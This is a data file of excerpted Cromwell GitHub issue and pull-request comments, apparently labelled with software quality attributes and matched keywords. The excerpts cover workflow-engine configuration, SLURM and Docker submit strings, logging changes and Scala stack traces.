Integrability,😡 apparently thumbs in approval messages don't count so here's another :+1:. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1592/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1592#issuecomment-254609707:32,message,messages,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1592#issuecomment-254609707,1,['message'],['messages']
Modifiability,"	 }. 	# Outputs that will be retained when execution is complete; 	output {; 		File output_vcf = MergeGVCFs.output_vcf; 	}; }. #### TASKS ####. # Merge GVCFs generated per-interval for the same sample; task MergeGVCFs {; 	File input_file; String output_file_name = ""output.txt"". 	Int machine_mem_gb = 2; 	Int command_mem_gb = machine_mem_gb - 1. command {; echo ${input_file} > ${output_file_name}; }. 	runtime {; 		docker: ""ubuntu""; memory: ""${machine_mem_gb}G""; cpu: 1; 	}. 	output {; 		File output_vcf = ""${output_file_name}""; 	}; }; ```. `cromwell_options.json`; ```; {; ""final_workflow_outputs_dir"":""s3://3-bucket"",; ""use_relative_output_paths"":true,; ""final_workflow_log_dir"":""s3://s3-bucket/wf_logs""; }; ```. error:; ```; [2019-06-15 19:50:15,63] [error] WorkflowManagerActor Workflow c9dd69e1-121e-45bc-911f-92d6bb6a2074 failed (during FinalizingWorkflowState): cromwell.engine.io.IoAttempts$EnhancedCromwellIoException: [Attempted 1 time(s)] - IllegalArgumentException: copying directories is not yet supported: s3://s3bucket/WGS_BAM_to_GVCF/c9dd69e1-121e-45bc-911f-92d6bb6a2074/call-MergeGVCFs/output.txt; Caused by: java.lang.IllegalArgumentException: copying directories is not yet supported: s3://s3bucket/c9dd69e1-121e-45bc-911f-92d6bb6a2074/call-MergeGVCFs/output.txt; 	at com.google.common.base.Preconditions.checkArgument(Preconditions.java:216); 	at org.lerch.s3fs.S3FileSystemProvider.copy(S3FileSystemProvider.java:420); 	at java.nio.file.Files.copy(Files.java:1274); 	at better.files.File.copyTo(File.scala:663); 	at cromwell.core.path.BetterFileMethods.copyTo(BetterFileMethods.scala:425); 	at cromwell.core.path.BetterFileMethods.copyTo$(BetterFileMethods.scala:424); 	at cromwell.filesystems.s3.S3Path.copyTo(S3PathBuilder.scala:160); 	at cromwell.engine.io.nio.NioFlow.$anonfun$copy$1(NioFlow.scala:84); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:87);",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4982#issuecomment-502394435:1330,Enhance,EnhancedCromwellIoException,1330,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4982#issuecomment-502394435,1,['Enhance'],['EnhancedCromwellIoException']
Modifiability, 				at wdl4s.expression.ValueEvaluator$$anonfun$evaluate$1.apply(ValueEvaluator.scala:45); 				at wdl4s.expression.ValueEvaluator$$anonfun$evaluate$1.apply(ValueEvaluator.scala:45); 				at scala.util.Try$.apply(Try.scala:192); 				at wdl4s.expression.ValueEvaluator.evaluate(ValueEvaluator.scala:45); 				at wdl4s.expression.ValueEvaluator.evaluate(ValueEvaluator.scala:112); 				at wdl4s.WdlExpression$.evaluate(WdlExpression.scala:85); 				at wdl4s.WdlExpression.evaluate(WdlExpression.scala:161); 				at wdl4s.Call$$anonfun$12$$anonfun$apply$7.apply(Call.scala:146); 				at wdl4s.Call$$anonfun$12$$anonfun$apply$7.apply(Call.scala:145); 				at scala.util.Success.flatMap(Try.scala:231); 				at wdl4s.Call$$anonfun$12.apply(Call.scala:145); 				at wdl4s.Call$$anonfun$12.apply(Call.scala:144); 				at scala.util.Success.flatMap(Try.scala:231); 				at wdl4s.Call.wdl4s$Call$$lookup$2(Call.scala:144); 				... 32 more; 		Suppressed: wdl4s.exception.VariableLookupException: outputBam:; Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 			at wdl4s.Call.wdl4s$Call$$lookup$2(Call.scala:176); 			at wdl4s.Call$$anonfun$lookupFunction$1.apply(Call.scala:181); 			at wdl4s.Call$$anonfun$lookupFunction$1.apply(Call.scala:181); 			at wdl4s.Call$$anonfun$4$$anonfun$5.apply(Call.scala:103); 			at wdl4s.Call$$anonfun$4$$anonfun$5.apply(Call.scala:103); 			at scala.util.Try$.apply(Try.scala:192); 			at wdl4s.Call$$anonfun$4.apply(Call.scala:103); 			at wdl4s.Call$$anonfun$4.apply(Call.scala:101); 			at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 			at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 			at scala.collection.Iterator$class.foreach(Iterator.scala:893); 			at scala.collection.AbstractIterator.foreach(Iterator.scala:1336); 			at scala.collection.IterableLike$class.foreach(IterableLike.scala:72); 			at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 			at scala.collection.Tra,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512:8005,Variab,VariableLookupException,8005,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512,1,['Variab'],['VariableLookupException']
Modifiability, 	at scala.collection.AbstractTraversable.to(Traversable.scala:104); 	at scala.collection.TraversableOnce.toList(TraversableOnce.scala:294); 	at scala.collection.TraversableOnce.toList$(TraversableOnce.scala:294); 	at scala.collection.AbstractTraversable.toList(Traversable.scala:104); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$4(EcmaScriptUtil.scala:111); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$4$adapted(EcmaScriptUtil.scala:107); 	at scala.collection.MapLike$MappedValues.$anonfun$foreach$3(MapLike.scala:253); 	at scala.collection.TraversableLike$WithFilter.$anonfun$foreach$1(TraversableLike.scala:789); 	at scala.collection.immutable.Map$Map2.foreach(Map.scala:146); 	at scala.collection.TraversableLike$WithFilter.foreach(TraversableLike.scala:788); 	at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:253); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$1(EcmaScriptUtil.scala:107); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$1$adapted(EcmaScriptUtil.scala:97); 	at cwl.internal.EnhancedRhinoSandbox.eval(EnhancedRhinoSandbox.scala:61); 	at cwl.internal.EcmaScriptUtil$.evalRaw(EcmaScriptUtil.scala:69); 	at cwl.internal.EcmaScriptUtil$.evalStructish(EcmaScriptUtil.scala:97); 	at cwl.ExpressionEvaluator$.eval(ExpressionEvaluator.scala:76); 	at cwl.ExpressionEvaluator$.evaluator$1(ExpressionEvaluator.scala:40); 	at cwl.ExpressionEvaluator$.$anonfun$evalExpression$1(ExpressionEvaluator.scala:43); 	at cwl.ExpressionInterpolator$.interpolate(ExpressionInterpolator.scala:140); 	at cwl.ExpressionEvaluator$.evalExpression(ExpressionEvaluator.scala:43); 	at cwl.EvaluateExpression$.$anonfun$script$2(EvaluateExpression.scala:11); 	at cwl.ExpressionEvaluator$.eval(ExpressionEvaluator.scala:35); 	at cwl.CommandLineBindingCommandPart.$anonfun$instantiate$5(CwlExpressionCommandPart.scala:79); 	at scala.Option.flatMap(Option.scala:171); 	at cwl.CommandLineBindingCommandPart.instantiate(CwlExpressionCommandPart.scala:78); 	at w,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3012#issuecomment-377570787:2649,adapt,adapted,2649,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3012#issuecomment-377570787,1,['adapt'],['adapted']
Modifiability, (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.$anonfun$applyOrElse$1(BackendWorkflowInitializationActor.scala:146); at cromwell.backend.BackendLifecycleActor.performActionThenRespond(BackendLifecycleActor.scala:44); at cromwell.backend.BackendLifecycleActor.performActionThenRespond$(BackendLifecycleActor.scala:40); at cromwell.backend.st,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:4486,Config,ConfigInitializationActor,4486,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['Config'],['ConfigInitializationActor']
Modifiability," /tmp/mydir && echo /tmp/mydir)"". . # `script-epilogue` configures a shell command to run after the execution of every command block. #. # If this value is not set explicitly, the default value is `sync`, equivalent to:. # script-epilogue = ""sync"". #. # To turn off the default `sync` behavior set this value to an empty string:. # script-epilogue = """". . # The list of possible runtime custom attributes. runtime-attributes = """""". String? docker. String? docker_name. """""". . # Submit string when there is no ""docker"" runtime attribute. submit = ""/bin/bash ${script}"". . # Submit string when there is a ""docker"" runtime attribute. submit-docker = """""". chmod u+x ${cwd}/execution/script && \. docker run --rm \. -v ${cwd}:${docker_cwd} \. ${docker_name} /bin/bash -c ${script}. """""". . # Root directory where Cromwell writes job results. This directory must be. # visible and writeable by the Cromwell process as well as the jobs that Cromwell. # launches. root = ""cromwell-executions"". . # File system configuration. filesystems {. . # For SFS backends, the ""local"" configuration specifies how files are handled. local {. . # Try to hard link (ln), then soft-link (ln -s), and if both fail, then copy the files. localization: [. ""hard-link"", ""soft-link"", ""copy"". ]. . # Call caching strategies. caching {. # When copying a cached result, what type of file duplication should occur. Attempted in the order listed below:. duplication-strategy: [. ""hard-link"", ""soft-link"", ""copy"". ]. . # Possible values: file, path. # ""file"" will compute an md5 hash of the file content. # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",. # in order to allow for the original file path to be hashed. hashing-strategy: ""file"". . # When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash. # If false or the md5 does not exist, will pro",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412883595:2625,config,configuration,2625,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412883595,1,['config'],['configuration']
Modifiability," 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Reading from cromwell_test.DATABASECHANGELOG |; | centaur | slf4j | INFO | 13:24:00.375 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.ut",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:1912,rewrite,rewriteBatchedStatements,1912,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532,1,['rewrite'],['rewriteBatchedStatements']
Modifiability," ICD 10 decision to give a unique id to every combination of things (e.g., ""got hit on the road by a chicken"") instead of combinations of them, eg. (""got hit"" + ""by chicken""). The first is harder because you represent more things (more containers), but the second isn't reproducible because if you lose ""by chicken"" you've lost the entire workflow. Does that make sense?. ## What can/should we do now?. So there are two things to think about. With the current representation of a workflow, we would want Singularity to be OCI compliant, and I would propose a plan to move forward is to expect this, and contribute to Singularity itself with the mindset of ""I want this to plug into AWS"" or ""I want this to plug into Kubernetes,"" etc. The backends for HPC are going to be good to go with just a SLURM or SGE backend, and then commands to load and run/exec a Singularity container. When the time comes and Singularity supports services, then we can start to develop (I think) the singularity backend configuration for cromwell, with clean commands to get statuses, start and stop, and otherwise integrate into the software. You guys seem pretty busy, so likely your best bet would be to just wait, because the community is going in that direction anyway. The other representation is to rethink this. An approach that I like is to move away from micro managing the workflow / software, and to set requirements for the data. If you set standard formats (meaning everything from the organization of files down to the headers of a data file) on the data itself, then the software gets built around that. A researcher can have confidence that the data he is collecting will work with software because it's validated to the format. The developers can have confidence their tools will work with data because of that same format. A new graduate student knows how to develop a new tool because there are nicely defined rules. A good example is to look at the BIDS (brain imaging data structure) that (has severa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214:6188,config,configuration,6188,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214,1,['config'],['configuration']
Modifiability," \; -o ${out} \; -e ${err} \; ```; which overwrites `stdout` and `stderr` written by the `script` file, which seems inappropriate. The following should have been used instead:; ```; sbatch \; -o ${out}.sbatch \; -e ${err}.sbatch \; ```; Similarly to how it is advised for [SGE](https://cromwell.readthedocs.io/en/stable/backends/SGE/) where `${out}.qsub` and `${err}.qsub` are used in place of `${out}` and `${err}`. The current workaround suggested by @honestAnt is instead to use in the Cromwell configuration file something like this:; ```; submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; mv ${cwd}/execution/rc ${cwd}/execution/rc.tmp; sleep 60; mv ${cwd}/execution/rc.tmp ${cwd}/execution/rc; """"""; ```; A better alternative would be to use in the Cromwell configuration file something like this (as suggested [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/src/ci/resources/local_provider_config.inc.conf)):; ```; script-epilogue = ""sleep 60 && sync"". submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; """"""; ```; But both options are way less than ideal and the choice of `60` might not be sufficient for all NFS configurations. If anybody wants to try to trigger this issue on an NFS shared filesystem setup, the following WDL should do the trick:; ```; version 1.0. workflow main {; scatter (idx in range(256)) {; call main {; input:; i = idx; }; }; output { Array[Int] n = main.n }; }. task main {; input {; Int i; }. command <<<; set -euo pipefail; echo ~",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:4760,config,configuration,4760,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956,1,['config'],['configuration']
Modifiability," docker_cwd; String docker_cid; String docker_script; String docker_out; String docker_err. String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg"". command {. # make sure there is no preexisting Docker CID file; rm -f ${docker_cid}; # run as in the original configuration without --rm flag (will remove later); docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializat",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:3922,Config,ConfigInitializationActor,3922,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['Config'],['ConfigInitializationActor']
Modifiability," failed. The job was stopped before the command finished. PAPI error code 10. 15: Gsutil failed: failed to upload logs for ""gs://xxx/cromwell-execution/wf_hello/28f84555-6e06-41be-891b-84de0f35ee74/call-hello/"": cp failed: gsutil -h Content-type:text/plain -q -m cp /var/log/google-genomics/*.log gs://xxx/cromwell-execution/wf_hello/28f84555-6e06-41be-891b-84de0f35ee74/call-hello/, command failed: BadRequestException: 400 Bucket is requester pays bucket but no user project provided.; ```; Is this because Pipelines API version 1 does not support buckets with requester pays? If so, why cannot Cromwell just say so? Notice that the [tutorial](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/) does not say that requester pays does not work with Pipelines API version 1, it says instead `more information for Requester Pays can be found at: [Requester Pays](https://cloud.google.com/storage/docs/requester-pays)`. In any case, I have removed the Requester Pays option from the bucket, as I pretty much given up on that. I was then able to run the `hello.wdl` workflow fine using the configuration file above. I tried to run the `mutect2.wdl` workflow and then I have encountered a new issue when trying to localize a file in a bucket for which I have permissions to read without problems using my Google account. The error contained the following:; ```; command failed: AccessDeniedException: 403 xxx@xxx.gserviceaccount.com does not have storage.objects.list access to the Google Cloud Storage bucket.; ```; I have tried to fix that as follows:; ```; $ gcloud projects add-iam-policy-binding xxx --member serviceAccount:xxx@xxx.gserviceaccount.com --role roles/storage.objects.list; ERROR: Policy modification failed. For a binding with condition, run ""gcloud alpha iam policies lint-condition"" to identify issues in condition.; ERROR: (gcloud.projects.add-iam-policy-binding) INVALID_ARGUMENT: Role roles/storage.objects.list is not supported for this resource.; ```; No luck.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665256471:4564,config,configuration,4564,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665256471,1,['config'],['configuration']
Modifiability," notice that `${out}` and `${err}` change between `submit` and `submit-docker`. When I would check the job that Cromwell schedules through SLURM, it would always fail. But I'm fairly sure that the job was failing to start because it was trying to write stdout to `/cromwell-executions/.../execution/stdout`, this is what led me to #1499. 3. An easy fix, but if your backend doesn't export a job-id, you need to set `run-in-background = true` in that backend's config. ### The results. The following execution strings can be inserted into the two container configs:; - Singularity: `singularity exec --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${script}`; - udocker: `udocker run ${""--user "" + docker_user} --rm -v ${cwd}:${docker_cwd} ${docker} ${script}`. My _container_ config template for no workflow manager:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: singularity; providers: {; singularity {; # The backend custom configuration.; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; run-in-background = true; # The list of possible runtime custom attributes.; runtime-attributes = """"""; String? docker; String? docker_user; """"""; # Submit string when there is a ""docker"" runtime attribute.; submit-docker = """"""; ## PLACE THE CORRECT CONTAINER COMMAND HERE ##; """"""; }; }; }; }; ```. And applied for something like SLURM:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: SLURM; providers: {; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 2; Int requested_memory_mb_per_core = 8000; String? queue; String? docker; String? docker_user; """"""; # you should have a submit script as well, ; submit-docker = """"""; sbatch -J ${job_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840:2862,config,configuration,2862,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840,1,['config'],['configuration']
Modifiability," time as the `rc` file and would increase the likelihood that they would all have been synced at the same time. However, this would not give the intended behavior when running in Google Cloud. Another problem that I have noticed is that there are multiple places in the Cromwell documentation that advise, when running Cromwell with SLURM, to use configurations such as (see [here](https://cromwell.readthedocs.io/en/stable/tutorials/Containers/#configuration)):; ```; sbatch \; -o ${cwd}/execution/stdout \; -e ${cwd}/execution/stderr \; ```; or as (see [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#e-now-add-the-following-text-after-line-479-ie-after-the-line-reading-default-slurm-ensure-that-the-lines-that-show-line-breaks-in-this-document-are-in-fact-single-lines-in-referenceconf), or [here](https://cromwell.readthedocs.io/en/stable/backends/SLURM/), or [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#configure-the-execution-environment-for-cromwell), or [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/slurm.conf)); ```; sbatch \; -o ${out} \; -e ${err} \; ```; which overwrites `stdout` and `stderr` written by the `script` file, which seems inappropriate. The following should have been used instead:; ```; sbatch \; -o ${out}.sbatch \; -e ${err}.sbatch \; ```; Similarly to how it is advised for [SGE](https://cromwell.readthedocs.io/en/stable/backends/SGE/) where `${out}.qsub` and `${err}.qsub` are used in place of `${out}` and `${err}`. The current workaround suggested by @honestAnt is instead to use in the Cromwell configuration file something like this:; ```; submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_s",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:3552,config,configure-the-execution-environment-for-cromwell,3552,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956,1,['config'],['configure-the-execution-environment-for-cromwell']
Modifiability,"""The E2 machine series also contains shared-core machine types that use context- switching to time-share a physical core between vCPUs for multitasking"". Essentially, they are garbage machines that give you 1/2 the CPUs you ask for, and have horrid I/O. IMO, no one should ever be given one, unless they've explicitly asked for it. Especially in a bioinformatics environment, where you're going to be reading and writing large files on a regular basis. Where in the code is the E2 default set? That's the part I was unable to figure out. If I could have that, I can fix it, put in a PR, and make our own version that doesn't require us to rewrite all our task files. Thank you",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2256114108:639,rewrite,rewrite,639,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2256114108,1,['rewrite'],['rewrite']
Modifiability,"""instance variable"" .... named ....?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1435#issuecomment-247774072:10,variab,variable,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1435#issuecomment-247774072,1,['variab'],['variable']
Modifiability,"""submit-docker"" (sorry for reversal) is one of the configuration option in Cromwell config file. See eg. here how additional volumes are mounted (last section): https://davetang.org/muse/2019/12/24/execute-gatk-workflows-locally. In the same way, you can run docker command that passes `--privileged=true` option.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-701190239:51,config,configuration,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-701190239,2,['config'],"['config', 'configuration']"
Modifiability,"## Liquibase logging changes. This PR started out just fixing the leaking of Liquabase messages into stdout. Before this PR, from [logs from a recent run](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577494577):. | Application | Logger | Level | Message |; |---|---|---|---|; | cromwell | slf4j | INFO | 2022-07-22 13:23:56,018 INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:57 PM liquibase.lockservice |; | cromwell | stdout | INFO | INFO: Successfully acquired change log lock |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Creating database history table with name: cromwell_test.DATABASECHANGELOG |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Reading from cromwell_test.DATABASECHANGELOG |; | centaur | slf4j | INFO | 13:24:00.375 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur |",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:467,rewrite,rewriteBatchedStatements,467,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532,1,['rewrite'],['rewriteBatchedStatements']
